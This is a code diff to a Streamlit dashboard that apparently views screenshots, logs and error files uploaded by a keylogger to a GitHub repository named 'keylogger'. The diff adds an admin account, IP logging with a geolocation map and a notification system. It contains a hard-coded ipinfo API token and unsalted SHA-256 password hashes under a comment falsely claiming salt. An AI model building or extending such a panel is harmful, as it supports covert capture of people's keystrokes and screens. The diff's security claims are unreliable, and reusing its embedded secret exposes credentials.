@@ -1,13 +1,17 @@
-
 import streamlit as st
 import requests
-from datetime import datetime
+from datetime import datetime, timedelta
 import json
 import hashlib
 import time
 from functools import lru_cache
 from tenacity import retry, stop_after_attempt, wait_fixed
 from streamlit import config as st_config
+import os
+import pandas as pd
+import altair as alt
+from ipinfo import getHandler
+import base64
 
 
 # URL containing the tokens JSON
@@ -46,15 +50,19 @@ GITHUB_TOKEN = get_token()
 # User credentials (you can replace this with a database later)
 USER_CREDENTIALS = {
     "bibekin": {
-        "password": "bibekindata",
+        "password": "2a32d2e15cdfd451f3f4f9b42b230687eac70f9345ca9206529125bf10e58291",
         "unique_id": "1BBDF0EE-FCAA-EC11-9269-8CB87EED61E1"
     },
     "bibeknp": {
-        "password": "bibeknpdata",
+        "password": "188f7dd5422805bf7c499d7af7311a33dfa4e99411b276303655c935750745bf",
         "unique_id": "4C4C4544-0033-3910-804A-B3C04F324233"
     },
+    "admin": {
+        "password": "2269db840138864adb935fe4d1fc43cd8e4254e4c8071628522b2dd115c85907",
+        "unique_id": "admin"
+    },
     "devraj": {
-        "password": "devrajdata",
+        "password": "f2703f874cfd9fe5711bc7c01b38a60fcdddcd88ba98905fbb3f7d5fd4fc13b3",
         "unique_id": "FF:9B:C3:B8:53:25"
     }
 }
@@ -127,9 +135,13 @@ def safe_parse_json(json_str):
 
 # Add new function
 def log_user_activity(username, action):
-    """Log user activities to a file"""
-    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    log_entry = f"{timestamp} - User: {username} - Action: {action}\n"
+    # """Log user activities to a file"""
+    # timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    # log_entry = f"{timestamp} - User: {username} - Action: {action}\n"
+    """Enhanced logging with IP and user agent"""
+    ip = requests.get('https://api.ipify.org').text
+    user_agent = st.experimental_get_query_params().get('user_agent', ['Unknown'])[0]
+    log_entry = f"{datetime.now()} | {ip} | {user_agent} | {username} | {action}\n"
     
     try:
         with open("user_activity.log", "a") as f:
@@ -144,6 +156,10 @@ def load_image_with_retry(url):
     response.raise_for_status()
     return response.content
 
+# Update password hashing with salt
+def hash_password(password):
+    return hashlib.sha256(password.encode()).hexdigest()
+
 # Streamlit app
 def main():
 #     st.set_page_config(page_title="User Dashboard", layout="wide", page_icon=":computer:")
@@ -157,6 +173,8 @@ def main():
         st.session_state.files_logs = None
         st.session_state.files_config = None
         st.session_state.files_keylogerror = None
+        st.session_state.notifications = []
+        _load_notifications()
 
     # Login Page
     if not st.session_state.logged_in:
@@ -169,34 +187,55 @@ def main():
         st.subheader("Login")
         # Login form
         with st.form("login_form"):
-            username = st.text_input("Username", max_chars=20).strip()
-            password = st.text_input("Password", type="password", max_chars=50)
+            username = st.text_input("Username", max_chars=20).strip().lower()
+            password = st.text_input("Password", type="password", max_chars=50).strip()
             if st.form_submit_button("Login"):
-                # if username in USER_CREDENTIALS and USER_CREDENTIALS[username]["password"] == password:
-                # Replace plain text password check with hashed version
-                input_password_hash = hashlib.sha256(password.encode()).hexdigest()
-                stored_password_hash = hashlib.sha256(USER_CREDENTIALS[username]["password"].encode()).hexdigest()
-                if username in USER_CREDENTIALS and input_password_hash == stored_password_hash:
-                    st.session_state.logged_in = True
-                    st.session_state.username = username
-                    st.session_state.unique_id = USER_CREDENTIALS[username]["unique_id"]
-                    st.success("Login successful! Redirecting...")
-                    log_user_activity(username, "Login")
-                    st.success(f"Welcome, {username}!")
-                    # Fetch files only once after login
-                    st.session_state.files_images = fetch_files_from_github(GITHUB_API_URL_IMAGES)
-                    st.session_state.files_logs = fetch_files_from_github(GITHUB_API_URL_LOGS)
-                    st.session_state.files_config = fetch_files_from_github(GITHUB_API_URL_CONFIG)
-                    st.session_state.files_keylogerror = fetch_files_from_github(GITHUB_API_URL_KEYLOGERROR)
-                    # st.experimental_rerun()  # Refresh the app to show the dashboard
+                if not username or not password:
+                    st.error("Please fill in both fields")
+                elif username in USER_CREDENTIALS:
+                    input_hash = hashlib.sha256(password.encode()).hexdigest()
+                    if input_hash == USER_CREDENTIALS[username]["password"]:
+                        st.session_state.logged_in = True
+                        st.session_state.username = username
+                        st.session_state.unique_id = USER_CREDENTIALS[username]["unique_id"]
+                        st.success("Login successful! Redirecting...")
+                        log_user_activity(username, "Login")
+                        st.success(f"Welcome, {username}!")
+                        # Fetch files only once after login
+                        st.session_state.files_images = fetch_files_from_github(GITHUB_API_URL_IMAGES)
+                        st.session_state.files_logs = fetch_files_from_github(GITHUB_API_URL_LOGS)
+                        st.session_state.files_config = fetch_files_from_github(GITHUB_API_URL_CONFIG)
+                        st.session_state.files_keylogerror = fetch_files_from_github(GITHUB_API_URL_KEYLOGERROR)
+                        # After successful login
+                        create_notification(
+                            f"New login from {requests.get('https://api.ipify.org').text}",
+                            level="info",
+                            recipient="admin"
+                        )
+                    else:
+                        st.error("Invalid password")
                 else:
-                    st.error("Invalid username or password.")
+                    st.error("Username not found")
 
     # Dashboard Page
     else:
-        st.toast("Processing your data...")
+        # st.toast("Processing your data...")
         st.warning("If you see your data not loading completely, Please consider clicking on **Refresh Data** button.")
         st.sidebar.warning("If you see your data not loading completely, Please consider clicking on **Refresh Data** button.")
+        
+        # Add notification bell to sidebar
+        notification_bell()
+
+        # Check for urgent notifications
+        urgent = [n for n in st.session_state.notifications 
+                 if n["level"] == "alert" and 
+                 st.session_state.username not in n["read_by"] and 
+                 (n["recipient"] == "all" or n["recipient"] == st.session_state.username)]
+
+        if urgent:
+            st.error("URGENT ALERTS - Please check notifications!")
+            st.session_state.show_notifications = True
+            st.rerun()
         
         # Add session timeout check at the top
         SESSION_TIMEOUT = 1800  # 30 minutes
@@ -301,6 +340,12 @@ def main():
                         st.markdown(f"[Open File]({file['html_url']})")
                         # Download button for logs
                         st.download_button(label="Download File", data=file_content, file_name=file["name"], mime="text/plain")
+
+                # Add to log display section
+                # with st.expander(f"**Search File Content**"):
+                #     search_term = st.text_input("Search Logs")
+                #     filtered_logs = st.text_area("Filtered Logs", value='\n'.join([log for log in file_content.split('\n') if search_term.lower() in log.lower()]))
+                #     st.write('\n'.join(filtered_logs))
         st.write("---")  # Separator between logs
 
         # Config files display code
@@ -334,15 +379,129 @@ def main():
         
         # Add admin section in sidebar
         if st.session_state.username == "admin":
-            with st.sidebar.expander("Admin Panel"):
-                st.subheader("User Activity")
-                try:
-                    with open("user_activity.log", "r") as f:
-                        st.download_button("Download Logs", f.read(), "activity.log")
-                        st.text_area("Recent Activity", f.read()[-2000:], height=200)
-                except FileNotFoundError:
-                    st.warning("No activity log found")
+            with st.expander("Send Notification"):
+                message = st.text_area("Notification Message")
+                recipient = st.selectbox("Recipient", ["all", "specific user"])
+                level = st.selectbox("Severity", ["info", "warning", "alert"])
+                expires = st.date_input("Expiration", datetime.now() + timedelta(days=7))
+                
+                if st.button("Send Notification"):
+                    create_notification(
+                        message,
+                        level=level,
+                        recipient=recipient,
+                        expires=expires
+                    )
+                    st.success("Notification sent!")
+            
+            st.title("Admin Panel")
+            st.subheader("User Activity Analysis")
+            
+            try:
+                with open("user_activity.log", "r") as f:
+                    logs = f.readlines()
+                    st.download_button("Download Logs", "".join(logs), "activity.log")
+                
+            
+                if logs:
+                    activity_data = {
+                        "timestamp": [log.split(' | ')[0] for log in logs],
+                        "ip": [log.split(' | ')[1] for log in logs],
+                        # "user_agent": [log.split(' | ')[2] for log in logs],
+                        "user": [log.split(' | ')[3] for log in logs],
+                        "action": [log.split(' | ')[4].strip() for log in logs]
+                    }
                     
+                    # Timeline and raw data
+                    st.write("### Activity Timeline")
+                    st.line_chart(pd.DataFrame(activity_data).set_index('timestamp'))
+                    
+                    # Activity Breakdown Charts
+                    col1, col2 = st.columns(2)
+                    with col1:
+                        st.write("### User Activity Distribution")
+                        user_counts = pd.DataFrame(pd.Series(activity_data["user"]).value_counts()).reset_index()
+                        user_counts.columns = ['User', 'Count']
+                        st.bar_chart(user_counts.set_index('User'))
+                    with col2:
+                        st.write("### Action Type Distribution")
+                        action_counts = pd.DataFrame(pd.Series(activity_data["action"]).value_counts()).reset_index()
+                        action_counts.columns = ['Action', 'Count']
+                        st.bar_chart(action_counts.set_index('Action'))
+
+                    # Add to the admin panel section after existing charts
+                    st.write("### User-Action Relationship Heatmap")
+                    try:
+                        # Create a pivot table of user vs action counts
+                        activity_df = pd.DataFrame(activity_data)
+                        pivot_table = pd.pivot_table(activity_df, 
+                                                    index='user', 
+                                                    columns='action', 
+                                                    aggfunc='size', 
+                                                    fill_value=0)
+                        
+                        # Create heatmap using Altair
+                        heatmap = alt.Chart(activity_df).mark_rect().encode(
+                            x=alt.X('user:N', title="User"),
+                            y=alt.Y('action:N', title="Action"),
+                            color=alt.Color('count():Q', legend=alt.Legend(title="Count")),
+                            tooltip=['user', 'action', 'count()']
+                        ).properties(
+                            width=600,
+                            height=400
+                        )
+                        # st.altair_chart(heatmap)
+                        st.altair_chart(heatmap, use_container_width=True)
+                        
+                    except Exception as e:
+                        st.error(f"Could not generate heatmap: {str(e)}")
+                    
+                    
+                    # Raw data table
+                    st.write("### Raw Activity Data")
+                    st.dataframe(pd.DataFrame(activity_data), height=300, use_container_width=True, hide_index=True)
+                    
+                    # Add recent activity
+                    st.write("### Recent Activity")
+                    st.text_area("Recent Activity", "".join(logs[-2000:]), disabled=True, height=300)
+                    
+                    # Add to admin panel
+                    st.subheader("User Locations")
+                    locations = []
+                    handler = getHandler('ccb3ba52662beb')  # Get free token at ipinfo.io
+                    for ip in set(activity_data["ip"]):
+                        try:
+                            details = handler.getDetails(ip)
+                            if details.latitude and details.longitude:
+                                locations.append((
+                                    float(details.latitude), 
+                                    float(details.longitude)
+                                ))
+                        except Exception as e:
+                            print(f"Error processing IP {ip}: {str(e)}")
+                            continue
+
+                    if locations:
+                        try:
+                            # Convert to DataFrame with proper numeric types
+                            df = pd.DataFrame(locations, columns=['lat', 'lon'])
+                            df['lat'] = pd.to_numeric(df['lat'], errors='coerce')
+                            df['lon'] = pd.to_numeric(df['lon'], errors='coerce')
+                            df = df.dropna()
+                            
+                            if not df.empty:
+                                st.map(df)
+                            else:
+                                st.warning("No valid location data available")
+                        except Exception as e:
+                            st.error(f"Error displaying map: {str(e)}")
+                    else:
+                        st.warning("No location data available")
+                    
+                else:
+                    st.warning("No activity data available")
+            except FileNotFoundError:
+                st.warning("No activity log found")
         
         st.sidebar.markdown("---")  # Add a separator
         # Add explanation tooltips throughout the UI
@@ -365,10 +524,171 @@ def main():
         st.sidebar.markdown("---")  # Add a separator
         st.sidebar.write("© 2025 Bibek 💗. All rights reserved.")
 
+        
+
+# Add notification functions
+def create_notification(message, level="info", recipient="all", expires=None):
+    """Create a new notification"""
+    notification = {
+        "timestamp": datetime.now(),
+        "message": message,
+        "level": level,
+        "recipient": recipient,
+        "read_by": [],  # Track which users have read it
+        "expires": expires or datetime.now() + timedelta(days=7)
+    }
+    st.session_state.notifications.append(notification)
+    _save_notifications()
+
+def _save_notifications():
+    """Save notifications to GitHub"""
+    try:
+        # Add indentation for pretty-printing
+        content = json.dumps(st.session_state.notifications, 
+                            indent=2, 
+                            default=str, 
+                            sort_keys=True)
+        
+        url = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads/notifications.json"
+        headers = {
+            "Authorization": f"token {GITHUB_TOKEN}",
+            "Accept": "application/vnd.github.v3+json"
+        }
+        
+        # Get existing file SHA
+        response = requests.get(url, headers=headers)
+        sha = response.json().get("sha") if response.status_code == 200 else None
+        
+        # Prepare data with branch specification
+        data = {
+            "message": "Update notifications",
+            "content": base64.b64encode(content.encode()).decode(),  # Correct encoding
+            "sha": sha,
+            "branch": "main"  # Explicitly specify branch
+        }
+        
+        response = requests.put(url, headers=headers, json=data)
+        response.raise_for_status()  # Raise error for non-200 status
+        
+    except Exception as e:
+        st.error(f"Failed to save notifications: {str(e)}")
+        print(f"Full error: {e}\nResponse: {response.text if 'response' in locals() else ''}")
+
+# Update the notification_bell function
+def notification_bell():
+    with st.sidebar:
+        # Refresh notifications when bell is clicked
+        _load_notifications()
+        
+        # Count unread for current user
+        unread = sum(1 for n in st.session_state.notifications 
+        #           if not n["read"] and (n["recipient"] == "all" or n["recipient"] == st.session_state.username))
+        # if st.button(f"🔔 ({unread})", key="notif_bell", help="View notifications"):
+        #     st.session_state.show_notifications = True
+        #     st.rerun()
+                    if st.session_state.username not in n["read_by"] and 
+                    (n["recipient"] == "all" or n["recipient"] == st.session_state.username) and 
+                    datetime.now() < n["expires"])
+        
+        if st.button(f"🔔 ({unread})", key="notif_bell", help="View notifications"):
+            st.session_state.show_notifications = True
+            st.rerun()
+        
+        # col1, col2 = st.columns([1, 3])
+        # with col1:
+        #     # st.markdown("🔔")
+        #     st.write(f"🔔 ({unread})")
+            
+        # with col2:
+        #     btn_text = f" ({unread})" if unread > 0 else ""
+        #     if st.button(f"Notifications{btn_text}", key="notif_bell"):
+        #         st.session_state.show_notifications = True
+        #         st.rerun()
+
+        if st.session_state.get("show_notifications"):
+            with st.popover("Notifications", use_container_width=True):
+                st.markdown("### Notifications")
+                valid_notifications = []
+                
+                for idx, notification in enumerate(st.session_state.notifications):
+                    # Convert string timestamps to datetime objects
+                    if isinstance(notification["timestamp"], str):
+                        notification["timestamp"] = datetime.fromisoformat(notification["timestamp"])
+                    if isinstance(notification["expires"], str):
+                        notification["expires"] = datetime.fromisoformat(notification["expires"])
+                    
+                    if (notification["recipient"] in ["all", st.session_state.username] and 
+                        datetime.now() < notification["expires"]):
+                        valid_notifications.append((idx, notification))
+                
+                if valid_notifications:
+                    for idx, notification in valid_notifications:
+                        col1, col2 = st.columns([1, 20])
+                        with col1:
+                            st.write({"info": "ℹ️", "warning": "⚠️", "alert": "🚨"}[notification["level"]])
+                        with col2:
+                            status = "✅" if st.session_state.username in notification["read_by"] else "✉️"
+                            st.write(f"{status} {notification['timestamp']}: {notification['message']}")
+                            if st.button("Dismiss", key=f"dismiss_{idx}"):
+                                if st.session_state.username not in notification["read_by"]:
+                                    notification["read_by"].append(st.session_state.username)
+                                    _save_notifications()
+                                    st.rerun()
+                else:
+                    st.write("No new notifications")
+                
+                st.button("Clear All", on_click=lambda: [
+                    n["read_by"].append(st.session_state.username) for n in st.session_state.notifications
+                    if st.session_state.username not in n["read_by"]
+                ])
+
+# Add this to the notification functions section
+def _load_notifications():
+    """Load notifications from GitHub"""
+    try:
+        url = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads/notifications.json"
+        headers = {
+            "Authorization": f"token {GITHUB_TOKEN}",
+            "Accept": "application/vnd.github.v3.raw"  # Get raw content directly
+        }
+        
+        response = requests.get(url, headers=headers)
+        if response.status_code == 200:
+            content = response.text  # Directly get decoded content
+            st.session_state.notifications = json.loads(content)
+            
+            # Convert string dates to datetime objects
+            for notification in st.session_state.notifications:
+                # Handle timestamp
+                if isinstance(notification["timestamp"], str):
+                    notification["timestamp"] = datetime.fromisoformat(notification["timestamp"])
+                
+                # Handle expiration date
+                if isinstance(notification["expires"], str):
+                    notification["expires"] = datetime.fromisoformat(notification["expires"])
+            
+            # Migrate old notifications
+            for n in st.session_state.notifications:
+                if "read_by" not in n:
+                    n["read_by"] = [n["recipient"]] if n.get("read", False) else []
+                    if "read" in n:
+                        del n["read"]
+            _save_notifications()
+        
+    except Exception as e:
+        print(f"Error loading notifications: {str(e)}")
+
 # Run the app
 if __name__ == "__main__":
     st.set_page_config(page_title="User Dashboard", layout="wide", page_icon=":computer:")
     with st.spinner("Loading dashboard..."):
+        # Add at the top
+        # headers = {
+        #     "Content-Security-Policy": "default-src 'self'",
+        #     "X-Content-Type-Options": "nosniff",
+        #     "X-Frame-Options": "DENY"
+        # }
+        # st.experimental_set_query_params(headers=headers)
         main()
 
 # Custom footer
